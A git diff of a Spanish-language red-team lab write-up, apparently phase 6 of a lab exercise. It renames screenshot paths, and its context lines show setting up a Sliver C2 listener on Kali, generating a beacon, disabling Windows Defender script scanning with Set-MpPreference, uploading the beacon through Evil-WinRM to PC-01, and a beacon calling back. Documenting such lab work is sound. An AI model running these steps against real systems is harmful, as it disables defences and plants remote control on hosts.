@@ -28,7 +28,7 @@ PC-01 (10.0.3.7)
 ---
 
 ### 6.1 — Listener Sliver en Kali
-> 📸 Captura: ![fase6-01](../../screenshots/FASE-6-C2-Sliver/fase6-01-sliver-listener.png)
+> 📸 Captura: ![fase06-01](../../screenshots/FASE-06-C2-Sliver/fase06-01-sliver-listener.png)
 
 ```bash
 sudo systemctl start sliver
@@ -59,7 +59,7 @@ PROD escucha en `:443` y reenvía todo el tráfico a `10.0.2.9:443` (Kali Sliver
 ---
 
 ### 6.3 — Generación del beacon
-> 📸 Captura: ![fase6-02](../../screenshots/FASE-6-C2-Sliver/fase6-02-sliver-beacon-generated.png)
+> 📸 Captura: ![fase06-02](../../screenshots/FASE-06-C2-Sliver/fase06-02-sliver-beacon-generated.png)
 
 ```
 generate beacon \
@@ -105,7 +105,7 @@ Set-MpPreference -DisableScriptScanning $true
 ---
 
 ### 6.5 — Transferencia y ejecución
-> 📸 Captura: ![fase6-03](../../screenshots/FASE-6-C2-Sliver/fase6-03-beacon-upload-exec.png)
+> 📸 Captura: ![fase06-03](../../screenshots/FASE-06-C2-Sliver/fase06-03-beacon-upload-exec.png)
 
 ```powershell
 # Evil-WinRM — subir beacon
@@ -122,7 +122,7 @@ Info: Upload successful! (49164288 bytes)
 ---
 
 ### 6.6 — Beacon conectado
-> 📸 Captura: ![fase6-04](../../screenshots/FASE-6-C2-Sliver/fase6-04-sliver-session-active.png)
+> 📸 Captura: ![fase06-04](../../screenshots/FASE-06-C2-Sliver/fase06-04-sliver-session-active.png)
 
 ```
 [*] Beacon dc797c42 SUDDEN_COMMUNICATION - 10.0.2.9:34174 (PC-01) - windows/amd64
